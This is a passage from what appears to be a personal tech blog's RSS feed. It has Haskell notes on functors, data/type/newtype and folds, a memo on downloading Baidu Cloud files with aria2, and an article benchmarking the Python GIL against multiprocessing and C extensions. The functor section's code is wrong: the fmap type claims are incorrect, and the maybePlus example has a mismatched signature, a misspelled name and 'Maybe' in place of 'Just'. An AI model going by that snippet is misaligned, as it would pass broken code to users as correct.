>A functor maps a category to another category. It should contains two mappings for objects and for morphisms, with composition operation and category laws preserved.</p><p >There’s a trivial functor from Grp to Set, which maps groups to their underlying sets, and group morphisms to functions with same behavior but defined on sets instead of groups.</p><h2 id="paramateric-types-in-haskell">Paramateric Types in Haskell</h2><p >It’s common to create new types that hold values of other types. <code>List[a]</code> type constructor creates types that holds sequential values of same type; <code>Maybe[a]</code> creates types that hold operation states (failure, or success with returned values).</p><p >Usually we expect derived types to inherit functions from types being wrapped. For example, <code>List[Int]</code> should have element-wise addition as <code>Int</code> does, and <code>Maybe[Int]</code> should have similar operations with no burden of re-wrapping and unwrapping. <strong>Such ‘inheritance’ should be done automatically if possible, since it is only concerned with the structure of types instead of specific functions.</strong></p><h2 id="hask-category">Hask Category</h2><p >Haskell language itself forms a category, with <strong>all types</strong> being objects, and functions being morphisms. Such category is called Hask.</p><h2 id="hask-functors">Hask Functors</h2><div class="gk-code hljs" data-gk-id="BLOCK1"><div class="gk-code-display"><pre><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-type">Functor</span> m <span class="hljs-keyword">where</span></span></span><br><span class="line">    fmap :: (a -&gt; b) -&gt; m a -&gt; m b</span><br></pre></div></div><p  class="par"> A parameteric type implementing class <code>Functor</code> is a category functor, mapping Hask to one of its sub-category, where types <code>m a</code> are the object collection. The type constructor <code>m</code> maps objects, and specific <code>fmap</code> defined on <code>m</code> maps corresponding functions.</p><p >It’s worth noted that <code>(a -&gt; b) -&gt; m a -&gt; m b</code> can also read as <code>(a -&gt; b) -&gt; (m a -&gt; m b)</code>, as <code>-&gt;</code> is right-associative. This may provide a clearer view of <code>fmap</code>, which takes a regular function in Hask and returns the corresponding function in sub-category.</p><p >Examples:</p><p ><code>fmap (+) :: List[Int] -&gt; List[Int]</code> generates element-wise addition in <code>List[Int]</code>.</p><p  class="par"><code>fmap (+) :: Maybe Int -&gt; Maybe Int</code> generates such function:</p><p  class="noindent"></p><div class="gk-code hljs" data-gk-id="BLOCK2"><div class="gk-code-display"><pre><span class="line"><span class="hljs-title">maybePlus</span> :: <span class="hljs-type">Maybe</span> <span class="hljs-type">Int</span> -&gt; <span class="hljs-type">Maybe</span> <span class="hljs-type">Int</span></span><br><span class="line"><span class="hljs-title">maybePlus</span> _        <span class="hljs-type">Nothing</span>  = <span class="hljs-type">Nothing</span></span><br><span class="line"><span class="hljs-title">maybePlus</span> <span class="hljs-type">Nothing</span>  _        = <span class="hljs-type">Nothing</span></span><br><span class="line"><span class="hljs-title">maybePlut</span> (<span class="hljs-type">Just</span> x) (<span class="hljs-type">Just</span> y) = <span class="hljs-type">Maybe</span> (x + y)</span><br></pre></div></div>]]></content:encoded>
      
      
      <category domain="https://i.hsfzxjy.site/categories/Tech/">Tech</category>
      
      
      <category domain="https://i.hsfzxjy.site/tags/Haskell/">Haskell</category>
      
      
      <comments>https://i.hsfzxjy.site/haskell-category-theory-and-functor/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Haskell 笔记：data, type, newtype</title>
      <link>https://i.hsfzxjy.site/haskell-data-type-newtype/</link>
      <guid>https://i.hsfzxjy.site/haskell-data-type-newtype/</guid>
      <pubDate>Thu, 15 Nov 2018 16:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p &gt;新类型有自己的 data constructor（literals 可以看成特殊的 data constructor），由这一点来区分是否创建了新类型。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;data&lt;/code&gt; 创建了新类型，可以有多个 data constructo</description>
        
      
      
      
      <content:encoded><![CDATA[<p >新类型有自己的 data constructor（literals 可以看成特殊的 data constructor），由这一点来区分是否创建了新类型。</p><ul><li><code>data</code> 创建了新类型，可以有多个 data constructor。</li><li><code>newtype</code> 创建了新类型，只能有一个 data constructor，同时新类型的内存布局与原来的类型相同。</li><li><code>type</code> 没有创建新类型，只是建立了 alias，没有新的 data constructor。</li></ul><h2 id="type">type</h2><p >常用于语义化类型，是业务逻辑层的概念。</p><div class="gk-code hljs" data-gk-id="BLOCK1"><div class="gk-code-display"><pre><span class="line"><span class="hljs-class"><span class="hljs-keyword">type</span> <span class="hljs-type">ID</span> = <span class="hljs-type">Int</span></span></span><br><span class="line"></span><br><span class="line"><span class="hljs-title">a</span> = <span class="hljs-number">1</span> :: <span class="hljs-type">ID</span></span><br><span class="line"><span class="hljs-title">b</span> = a + <span class="hljs-number">2</span> <span class="hljs-comment">-- legal</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-title">showID</span> :: <span class="hljs-type">ID</span> -&gt; <span class="hljs-type">IO</span> ()</span><br><span class="line"><span class="hljs-title">showID</span> x = print x <span class="hljs-comment">-- legal, since Int has already been an instance of class Show</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">-- illegal, since Int has already been instantiated</span></span><br><span class="line"><span class="hljs-class"><span class="hljs-keyword">instance</span> <span class="hljs-type">Show</span> <span class="hljs-type">ID</span> <span class="hljs-keyword">where</span></span></span><br><span class="line">    <span class="hljs-comment">-- ...</span></span><br></pre></div></div><h2 id="newtype">newtype</h2><p >在编译期创建新类型，但差异在运行期被抹去。带有一个构造器。</p><div class="gk-code hljs" data-gk-id="BLOCK2"><div class="gk-code-display"><pre><span class="line"><span class="hljs-class"><span class="hljs-keyword">newtype</span> <span class="hljs-type">ID&#x27;</span> = <span class="hljs-type">ID&#x27;</span> <span class="hljs-type">Int</span></span></span><br><span class="line"></span><br><span class="line"><span class="hljs-title">a</span> = <span class="hljs-type">ID&#x27;</span> <span class="hljs-number">1</span></span><br><span class="line"><span class="hljs-title">b</span> = a + <span class="hljs-number">2</span> <span class="hljs-comment">-- illegal, since Int and ID&#x27; are totally different types</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-title">showID&#x27;</span> :: <span class="hljs-type">ID&#x27;</span> -&gt; <span class="hljs-type">IO</span> ()</span><br><span class="line"><span class="hljs-title">showID&#x27;</span> x = print x <span class="hljs-comment">-- illegal, since ID&#x27; is not an instance of Show</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">-- either</span></span><br><span class="line"><span class="hljs-title">showID&#x27;</span> (<span class="hljs-type">ID&#x27;</span> x) = print x</span><br><span class="line"><span class="hljs-comment">-- or</span></span><br><span class="line"><span class="hljs-class"><span class="hljs-keyword">instance</span> <span class="hljs-type">Show</span> <span class="hljs-type">ID&#x27;</span> <span class="hljs-keyword">where</span></span></span><br><span class="line">    show (<span class="hljs-type">ID&#x27;</span> x) = show x</span><br></pre></div></div>]]></content:encoded>
      
      
      <category domain="https://i.hsfzxjy.site/categories/Tech/">Tech</category>
      
      
      <category domain="https://i.hsfzxjy.site/tags/Haskell/">Haskell</category>
      
      
      <comments>https://i.hsfzxjy.site/haskell-data-type-newtype/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Haskell 笔记：folds</title>
      <link>https://i.hsfzxjy.site/haskell-fold/</link>
      <guid>https://i.hsfzxjy.site/haskell-fold/</guid>
      <pubDate>Fri, 09 Nov 2018 16:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;preludefoldl&quot;&gt;Prelude.foldl&lt;/h2&gt;
&lt;p &gt;&lt;code&gt;foldl&lt;/code&gt; 为 left-associative folding。&lt;/p&gt;
&lt;div class=&quot;gk-code hljs&quot; data-gk-id=&quot;BLOCK1</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="preludefoldl">Prelude.foldl</h2><p ><code>foldl</code> 为 left-associative folding。</p><div class="gk-code hljs" data-gk-id="BLOCK1"><div class="gk-code-display"><pre><span class="line"><span class="hljs-title">foldl</span> :: (b -&gt; a -&gt; b) -&gt; b -&gt; [a] -&gt; b</span><br><span class="line"><span class="hljs-title">foldl</span> f acc [] = acc</span><br><span class="line"><span class="hljs-title">foldl</span> f acc (x:xs) = foldl f (f acc x) xs</span><br></pre></div></div><p  class="par"> <code>foldl (+) 0 [1..3]</code> 等价于 <code>(((0 + 1) + 2) + 3)</code>。</p><ul><li>尾递归，因此有 strict 版本 <code>foldl&#39;</code></li><li>求值时必须先到达栈底，遍历完列表，因此无法处理无穷列表</li></ul><h2 id="datalistfoldl">Data.List.foldl’</h2><p ><code>foldl&#39;</code> 为 <code>foldl</code> 的 TRO 版本。</p><h2 id="preludefoldr">Prelude.foldr</h2><p ><code>foldr</code> 为 right-associative folding。</p><div class="gk-code hljs" data-gk-id="BLOCK2"><div class="gk-code-display"><pre><span class="line"><span class="hljs-title">foldr</span> :: (a -&gt; b -&gt; b) -&gt; b -&gt; [a] -&gt; b</span><br><span class="line"><span class="hljs-title">foldr</span> f acc [] = acc</span><br><span class="line"><span class="hljs-title">foldr</span> f acc (x:xs) = f x (foldr f acc xs)</span><br></pre></div></div><p  class="par"> <code>foldr (+) 0 [1..3]</code> 等价于 <code>(0 + (1 + (2 + 3)))</code></p><ul><li>没有尾递归，有爆栈的危险。</li><li>有向右展开的特点，而 Haskell 中许多数据结构都有向右递归的特点（如 Cons），因此可以很好地处理无穷递归的数据，从而更加通用。</li></ul><h2 id="preludefoldl1--preludefoldr1">Prelude.foldl1 &amp;&amp; Prelude.foldr1</h2><p >Helper functions。将 operator 限制为同一种类型，同时约去 accumulator。</p><div class="gk-code hljs" data-gk-id="BLOCK3"><div class="gk-code-display"><pre><span class="line"><span class="hljs-title">foldl1</span> :: (a -&gt; a -&gt; a) -&gt; [a] -&gt; a</span><br><span class="line"><span class="hljs-title">foldl1</span> f (x:xs) = foldl f x xs</span><br><span class="line"><span class="hljs-title">foldl1</span> _ [] = error</span><br><span class="line"></span><br><span class="line"><span class="hljs-title">foldr1</span> :: (a -&gt; a -&gt; a) -&gt; [a] -&gt; a</span><br><span class="line"><span class="hljs-title">foldr1</span> f (x:xs) = foldr f x xs</span><br><span class="line"><span class="hljs-title">foldr1</span> _ [] = error</span><br></pre></div></div><p  class="par"> 即，<code>foldr1</code> 将列表的第一个值作为 accumulator，将剩余部分作为 list，传给 <code>foldr</code>。<code>foldl</code> 同理。</p><h2 id="实践">实践</h2><h3 id="用-folds-实现-reverse">用 folds 实现 <code>reverse</code></h3><div class="gk-code hljs" data-gk-id="BLOCK4"><div class="gk-code-display"><pre><span class="line"><span class="hljs-title">reversel</span>, reverser :: [a] -&gt; [a]</span><br><span class="line"><span class="hljs-title">reversel</span> list = foldl (\acc x -&gt; x : acc) [] list</span><br><span class="line"></span><br><span class="line"><span class="hljs-title">reverser</span> list = foldr (\x acc -&gt; acc ++ [x]) [] list</span><br></pre></div></div><h3 id="用-foldr-实现-foldl">用 foldr 实现 foldl</h3><p >先归纳出 <code>foldr</code> 的泛性质。如果一个函数 <code>g</code> s.t.</p><div class="gk-code hljs" data-gk-id="BLOCK5"><div class="gk-code-display"><pre><span class="line"><span class="hljs-title">g</span> [] = v</span><br><span class="line"><span class="hljs-title">g</span> (x:xs) = f x (g xs)</span><br></pre></div></div><p  class="par"> 则 <code>g list === foldr f v list</code>.</p><p >再看 <code>foldl</code> 的定义：</p><div class="gk-code hljs" data-gk-id="BLOCK6"><div class="gk-code-display"><pre><span class="line"><span class="hljs-title">foldl</span> f v [] = v</span><br><span class="line"><span class="hljs-title">foldl</span> f v (x:xs) = foldl f (f v x) xs</span><br><span class="line"></span><br><span class="line">===&gt;</span><br><span class="line"></span><br><span class="line"><span class="hljs-title">foldl</span> f v list = g list v</span><br><span class="line">    <span class="hljs-keyword">where</span></span><br><span class="line">        g [] v = v</span><br><span class="line">        g (x:xs) v = g xs (f v x)</span><br><span class="line">        <span class="hljs-comment">-- 从左到右依次更新 v</span></span><br><span class="line"></span><br><span class="line">===&gt;</span><br><span class="line"></span><br><span class="line"><span class="hljs-title">foldl</span> f v list = g list v</span><br><span class="line">    <span class="hljs-keyword">where</span></span><br><span class="line">        g [] = id</span><br><span class="line">        g (x:xs) = \v -&gt; g xs (f v x)</span><br></pre></div></div><p  class="par"> 应有 <code>g (x:xs) === k x (g xs)</code>，我们计算 <code>k</code>：</p><div class="gk-code hljs" data-gk-id="BLOCK7"><div class="gk-code-display"><pre><span class="line"><span class="hljs-title">g</span> (x:xs)       === k x (g xs)</span><br><span class="line"><span class="hljs-title">g</span> (x:xs) v     === k x (g xs) v</span><br><span class="line"><span class="hljs-title">g</span> xs (f v x)   === k x (g xs) v</span><br><span class="line">(g xs) (f v x) === k x (g xs) v</span><br><span class="line"><span class="hljs-title">g&#x27;</span> (f v x)     === k x g&#x27; v</span><br><span class="line"><span class="hljs-title">k</span>              === \x g&#x27; v -&gt; g&#x27; (f v x)</span><br></pre></div></div><p  class="par"> 所以</p><div class="gk-code hljs" data-gk-id="BLOCK8"><div class="gk-code-display"><pre><span class="line"><span class="hljs-title">foldl</span> f v xs =</span><br><span class="line">    (foldr</span><br><span class="line">        (\x g&#x27; v -&gt; g&#x27; (f v x))</span><br><span class="line">        id</span><br><span class="line">        xs</span><br><span class="line">    ) v</span><br></pre></div></div>]]></content:encoded>
      
      
      <category domain="https://i.hsfzxjy.site/categories/Tech/">Tech</category>
      
      
      <category domain="https://i.hsfzxjy.site/tags/Haskell/">Haskell</category>
      
      
      <comments>https://i.hsfzxjy.site/haskell-fold/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>使用 Aria2 在 Ubuntu 中下载百度云资源</title>
      <link>https://i.hsfzxjy.site/download-in-ubuntu-with-aria/</link>
      <guid>https://i.hsfzxjy.site/download-in-ubuntu-with-aria/</guid>
      <pubDate>Sun, 10 Jun 2018 16:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p &gt;可以实现满带宽下载。&lt;/p&gt;
&lt;h1 id=&quot;配置-aria2&quot;&gt;配置 Aria2&lt;/h1&gt;
&lt;p &gt;从 &lt;a href=&quot;https://github.com/aria2/aria2/releases&quot;&gt;Github&lt;/a&gt; 下载源码 &lt;code&gt;./configure</description>
        
      
      
      
      <content:encoded><![CDATA[<p >可以实现满带宽下载。</p><h1 id="配置-aria2">配置 Aria2</h1><p >从 <a href="https://github.com/aria2/aria2/releases">Github</a> 下载源码 <code>./configure &amp;&amp; make -j8 &amp;&amp; sudo make install</code>。</p><h1 id="配置-chrome-插件">配置 Chrome 插件</h1><p >clone <code>https://github.com/acgotaku/BaiduExporter</code>。</p><div class="gk-code hljs" data-gk-id="BLOCK1"><div class="gk-code-display"><pre><span class="line">$ <span class="hljs-built_in">cd</span> ariac</span><br><span class="line">$ <span class="hljs-built_in">cat</span> &gt; start.sh</span><br><span class="line">&gt; <span class="hljs-comment">#!/bin/bash</span></span><br><span class="line">&gt; aria2c --conf=aria2.conf</span><br><span class="line">&gt; ^D</span><br><span class="line">$ <span class="hljs-built_in">chmod</span> +x start.sh</span><br><span class="line">$ ./start.sh</span><br></pre></div></div><h1 id="安装-chrome-插件">安装 Chrome 插件</h1><p >打开 <code>chrome://extensions</code>，<code>Load Unpacked</code> 选择 <code>chrome/release</code>。</p><p >完成后在百度云页面上会有 <code>导出下载</code> 按钮。</p>]]></content:encoded>
      
      
      <category domain="https://i.hsfzxjy.site/categories/Memo/">Memo</category>
      
      
      <category domain="https://i.hsfzxjy.site/tags/Ubuntu/">Ubuntu</category>
      
      
      <comments>https://i.hsfzxjy.site/download-in-ubuntu-with-aria/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>从伪并行的 Python 多线程说起</title>
      <link>https://i.hsfzxjy.site/python-gil-and-threads/</link>
      <guid>https://i.hsfzxjy.site/python-gil-and-threads/</guid>
      <pubDate>Fri, 09 Mar 2018 16:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;写在前面-6&quot;&gt;写在前面&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;作者电脑 CPU 为 4 核，因此使用 4 个线程测试是合理的&lt;/li&gt;
&lt;li&gt;本文使用的 &lt;code&gt;cpython&lt;/code&gt; 版本为 &lt;code&gt;3.6.4&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;本文使用的</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="写在前面-6">写在前面</h2><ul><li>作者电脑 CPU 为 4 核，因此使用 4 个线程测试是合理的</li><li>本文使用的 <code>cpython</code> 版本为 <code>3.6.4</code></li><li>本文使用的 <code>pypy</code> 版本为 <code>5.9.0-beta0</code>，兼容 Python 3.5 语法</li><li>本文使用的 <code>jython</code> 版本为 <code>2.7.0</code>，兼容 Python 2.7 语法</li><li>若无特殊说明，作语言解时，<code>python</code> 指 Python 语言；作解释器解时，<code>python</code> 指 <code>cpython</code></li></ul><p >本文使用的测速函数代码如下：</p><div class="gk-code hljs" data-gk-id="BLOCK1"><div class="gk-code-display"><pre><span class="line"><span class="hljs-keyword">from</span> __future__ <span class="hljs-keyword">import</span> print_function</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">import</span> sys</span><br><span class="line">PY2 = sys.version_info[<span class="hljs-number">0</span>] == <span class="hljs-number">2</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-comment"># 因为 Jython 不兼容 Python 3 语法，此处必须 hack 掉 range 以保证都是迭代器版本</span></span><br><span class="line"><span class="hljs-keyword">if</span> PY2:</span><br><span class="line">    <span class="hljs-built_in">range</span> = xrange  <span class="hljs-comment"># noqa</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">from</span> time <span class="hljs-keyword">import</span> time</span><br><span class="line"><span class="hljs-keyword">from</span> threading <span class="hljs-keyword">import</span> Thread</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">def</span> <span class="hljs-title function_">spawn_n_threads</span>(<span class="hljs-params">n, target</span>):</span><br><span class="line">    <span class="hljs-string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="hljs-string">    启动 n 个线程并行执行 target 函数</span></span><br><span class="line"><span class="hljs-string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    threads = []</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(n):</span><br><span class="line">        thread = Thread(target=target)</span><br><span class="line">        thread.start()</span><br><span class="line">        threads.append(thread)</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">for</span> thread <span class="hljs-keyword">in</span> threads:</span><br><span class="line">        thread.join()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">def</span> <span class="hljs-title function_">test</span>(<span class="hljs-params">target, number=<span class="hljs-number">10</span>, spawner=spawn_n_threads</span>):</span><br><span class="line">    <span class="hljs-string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="hljs-string">    分别启动 1, 2, 3, 4 个控制流，重复 number 次，计算运行耗时</span></span><br><span class="line"><span class="hljs-string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> (<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, ):</span><br><span class="line"></span><br><span class="line">        start_time = time()</span><br><span class="line">        <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(number):  <span class="hljs-comment"># 执行 number 次以减少偶然误差</span></span><br><span class="line">            spawner(n, target)</span><br><span class="line">        end_time = time()</span><br><span class="line"></span><br><span class="line">        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Time elapsed with {} branch(es): {:.6f} sec(s)&#x27;</span>.<span class="hljs-built_in">format</span>(n, end_time - start_time))</span><br></pre></div></div><h2 id="并行？伪并行？">并行？伪并行？</h2><p >学过操作系统的同学都知道，线程是现代操作系统底层一种轻量级的多任务机制。一个进程空间中可以存在多个线程，每个线程代表一条控制流，共享全局进程空间的变量，又有自己私有的内存空间。</p><p >多个线程可以同时执行。此处的“同时”，在较早的单核架构中表现为“伪并行”，即让线程以极短的时间间隔交替执行，从人的感觉上看它们就像在同时执行一样。但由于仅有一个运算单元，当线程皆执行计算密集型任务时，多线程可能会出现 1 + 1 &gt; 2 的反效果。</p><p >而“真正的并行”只能在多核架构上实现。对于计算密集型任务，巧妙地使用多线程或多进程将其分配至多个 CPU 上，通常可以成倍地缩短运算时间。</p><p >作为一门优秀的语言，python 为我们提供了操纵线程的库 <code>threading</code>。使用 <code>threading</code>，我们可以很方便地进行并行编程。但下面的例子可能会让你对“并行”的真实性产生怀疑。</p><p >假设我们有一个计算斐波那契数列的函数：</p><div class="gk-code hljs" data-gk-id="BLOCK2"><div class="gk-code-display"><pre><span class="line"><span class="hljs-keyword">def</span> <span class="hljs-title function_">fib</span>():</span><br><span class="line"></span><br><span class="line">    a = b = <span class="hljs-number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">100000</span>):</span><br><span class="line">        a, b = b, a + b</span><br></pre></div></div><p  class="par"> 此处我们不记录其结果，只是为了让它产生一定的计算量，使运算时间开销远大于线程创建、切换的时间开销。现在我们执行 <code>test(fib)</code>，尝试在不同数量的线程中执行这个函数。如果线程是“真并行”，时间开销应该不会随线程数大幅上涨。但执行结果却让我们大跌眼镜：</p><div class="gk-code hljs" data-gk-id="BLOCK3"><div class="gk-code-display"><pre><span class="line"># CPython，fib</span><br><span class="line">Time elapsed with 1 branch(es): 1.246095 sec(s)</span><br><span class="line">Time elapsed with 2 branch(es): 2.535884 sec(s)</span><br><span class="line">Time elapsed with 3 branch(es): 3.837506 sec(s)</span><br><span class="line">Time elapsed with 4 branch(es): 5.107638 sec(s)</span><br></pre></div></div><p  class="par"> 从结果中可以发现：时间开销几乎是正比于线程数的！这明显和多核架构的“真并行”相矛盾。这是为什么呢？</p><p >一切的罪魁祸首都是一个叫 GIL 的东西。</p><h2 id="gil">GIL</h2><h3 id="gil-是什么">GIL 是什么</h3><p >GIL 的全名是 the Global Interpreter Lock（全局解释锁），是常规 python 解释器（当然，有些解释器没有）的核心部件。我们看看官方的解释：</p><blockquote><p >The Python interpreter is not fully thread-safe. In order to support multi-threaded Python programs, there’s a global lock, called <strong>the global interpreter lock</strong> or <strong>GIL</strong>, that must be held by the current thread before it can safely access Python objects.</p><p >– via <a href="https://docs.python.org/3/c-api/init.html#thread-state-and-the-global-interpreter-lock">Python 3.6.4 Documentation</a></p></blockquote><p  class="par"> 可见，这是一个用于保护 Python 内部对象的全局锁（在进程空间中唯一），保障了解释器的线程安全。</p><p >这里用一个形象的例子来说明 GIL 的必要性（对资源抢占问题非常熟悉的可以跳过不看）：</p><blockquote><p >我们把整个进程空间看做一个车间，把线程看成是多条不相交的流水线，把线程控制流中的字节码看作是流水线上待处理的物品。Python 解释器是工人，整个车间仅此一名。操作系统是一只上帝之手，会随时把工人从一条流水线调到另一条——这种“随时”是不由分说的，即不管处理完当前物品与否。</p><p >若没有 GIL。假设工人正在流水线 A 处理 A1 物品，根据 A1 的需要将房间温度（一个全局对象）调到了 20 度。这时上帝之手发动了，工人被调到流水线 B 处理 B1 物品，根据 B1 的需要又将房间温度调到了 50 度。这时上帝之手又发动了，工人又调回 A 继续处理 A1。但此时 A1 暴露在了 50 度的环境中，安全问题就此产生了。</p><p >而 GIL 相当于一条锁链，一旦工人开始处理某条流水线上的物品，GIL 便会将工人和该流水线锁在一起。而被锁住的工人只会处理该流水线上的物品。就算突然被调到另一条流水线，他也不会干活，而是干等至重新调回原来的流水线。这样每个物品在被处理的过程中便总是能保证全局环境不会突变。</p></blockquote><p  class="par"> GIL 保证了线程安全性，但很显然也带来了一个问题：每个时刻只有一条线程在执行，即使在多核架构中也是如此——毕竟，解释器只有一个。如此一来，单进程的 Python 程序便无法利用到多核的优势了。</p><h3 id="验证">验证</h3><p >为了验证确实是 GIL 搞的鬼，我们可以用不同的解释器再执行一次。这里使用 pypy（有 GIL）和 jython（无 GIL）作测试：</p><div class="gk-code hljs" data-gk-id="BLOCK4"><div class="gk-code-display"><pre><span class="line"># PyPy, fib</span><br><span class="line">Time elapsed with 1 branch(es): 0.868052 sec(s)</span><br><span class="line">Time elapsed with 2 branch(es): 1.706454 sec(s)</span><br><span class="line">Time elapsed with 3 branch(es): 2.594260 sec(s)</span><br><span class="line">Time elapsed with 4 branch(es): 3.449946 sec(s)</span><br></pre></div></div><div class="gk-code hljs" data-gk-id="BLOCK5"><div class="gk-code-display"><pre><span class="line"># Jython, fib</span><br><span class="line">Time elapsed with 1 branch(es): 2.984000 sec(s)</span><br><span class="line">Time elapsed with 2 branch(es): 3.058000 sec(s)</span><br><span class="line">Time elapsed with 3 branch(es): 4.404000 sec(s)</span><br><span class="line">Time elapsed with 4 branch(es): 5.357000 sec(s)</span><br></pre></div></div><p  class="par"> 从结果可以看出，用 pypy 执行时，时间开销和线程数也是几乎成正比的；而 jython 的时间开销则是以较为缓慢的速度增长的。jython 由于下面还有一层 JVM，单线程的执行速度很慢，但在线程数达到 4 时，时间开销只有单线程的两倍不到，仅仅稍逊于 cpython 的 4 线程运行结果（5.10 secs）。由此可见，<strong>GIL 确实是造成伪并行现象的主要因素</strong>。</p><h2 id="如何解决？">如何解决？</h2><p >GIL 是 Python 解释器正确运行的保证，Python 语言本身没有提供任何机制访问它。但在特定场合，我们仍有办法降低它对效率的影响。</p><h3 id="使用多进程">使用多进程</h3><p >线程间会竞争资源是因为它们共享同一个进程空间，但进程的内存空间是独立的，自然也就没有必要使用解释锁了。</p><p >许多人非常忌讳使用多进程，理由是进程操作（创建、切换）的时间开销太大了，而且会占用更多的内存。这种担心其实没有必要——除非是对并发量要求很高的应用（如服务器），多进程增加的时空开销其实都在可以接受的范围中。更何况，我们可以使用进程池减少频繁创建进程带来的开销。</p><p >下面新建一个 <code>spawner</code>，以演示多进程带来的性能提升：</p><div class="gk-code hljs" data-gk-id="BLOCK6"><div class="gk-code-display"><pre><span class="line"><span class="hljs-keyword">from</span> multiprocessing <span class="hljs-keyword">import</span> Process</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">def</span> <span class="hljs-title function_">spawn_n_processes</span>(<span class="hljs-params">n, target</span>):</span><br><span class="line"></span><br><span class="line">    threads = []</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(n):</span><br><span class="line">        thread = Process(target=target)</span><br><span class="line">        thread.start()</span><br><span class="line">        threads.append(thread)</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">for</span> thread <span class="hljs-keyword">in</span> threads:</span><br><span class="line">        thread.join()</span><br></pre></div></div><p  class="par"> 使用 cpython 执行 <code>test(fib, spawner=spawn_n_processes)</code>，结果如下：</p><div class="gk-code hljs" data-gk-id="BLOCK7"><div class="gk-code-display"><pre><span class="line"># CPython, fib, multi-processing</span><br><span class="line">Time elapsed with 1 branch(es): 1.260981 sec(s)</span><br><span class="line">Time elapsed with 2 branch(es): 1.343570 sec(s)</span><br><span class="line">Time elapsed with 3 branch(es): 2.183770 sec(s)</span><br><span class="line">Time elapsed with 4 branch(es): 2.732911 sec(s)</span><br></pre></div></div><p  class="par"> 可见这里出现了“真正的并行”，程序效率得到了提升。</p><h3 id="使用-c-扩展">使用 C 扩展</h3><p >GIL 并不是完全的黑箱，CPython 在解释器层提供了控制 GIL 的开关——这就是 <code>Py_BEGIN_ALLOW_THREADS</code> 和 <code>Py_END_ALLOW_THREADS</code> 宏。这一对宏允许你在自定义的 C 扩展中释放 GIL，从而可以重新利用多核的优势。</p><p >沿用上面的例子，自定义的 C 扩展函数好比是流水线上一个特殊的物品。这个物品承诺自己不依赖全局环境，同时也不会要求工人去改变全局环境。同时它带有 <code>Py_BEGIN_ALLOW_THREADS</code> 和 <code>Py_END_ALLOW_THREADS</code> 两个机关，前者能砍断 GIL 锁链，这样工人被调度走后不需要干等，而是可以直接干活；后者则将锁链重新锁上，保证操作的一致性。</p><p >这里同样用一个 C 扩展做演示。由于 C 实现的斐波那契数列计算过快，此处采用另一个计算 PI 的函数：</p><div class="gk-code hljs" data-gk-id="BLOCK8"><div class="gk-code-display"><pre><span class="line"><span class="hljs-comment">// cfib.c</span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;python3.6m/Python.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="hljs-type">static</span> PyObject* <span class="hljs-title function_">fib</span><span class="hljs-params">(PyObject* self, PyObject* args)</span></span><br><span class="line">{</span><br><span class="line">    Py_BEGIN_ALLOW_THREADS</span><br><span class="line">    <span class="hljs-type">double</span> n = <span class="hljs-number">90000000</span>, i;</span><br><span class="line">    <span class="hljs-type">double</span> s = <span class="hljs-number">1</span>;</span><br><span class="line">    <span class="hljs-type">double</span> pi = <span class="hljs-number">3</span>;</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">2</span>; i &lt;= n * <span class="hljs-number">2</span>; i += <span class="hljs-number">2</span>) {</span><br><span class="line">        pi = pi + s * (<span class="hljs-number">4</span> / (i * (i + <span class="hljs-number">1</span>) * (i + <span class="hljs-number">2</span>)));</span><br><span class="line">        s = -s;</span><br><span class="line">    }</span><br><span class="line">    Py_END_ALLOW_THREADS</span><br><span class="line">    <span class="hljs-keyword">return</span> Py_None;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">// 模块初始化代码略去</span></span><br></pre></div></div><p  class="par"> 使用 cpython 执行 <code>test(cfib.fib)</code>，结果如下：</p><div class="gk-code hljs" data-gk-id="BLOCK9"><div class="gk-code-display"><pre><span class="line"># CPython, cfib, non-GIL</span><br><span class="line">Time elapsed with 1 branch(es): 1.334247 sec(s)</span><br><span class="line">Time elapsed with 2 branch(es): 1.439759 sec(s)</span><br><span class="line">Time 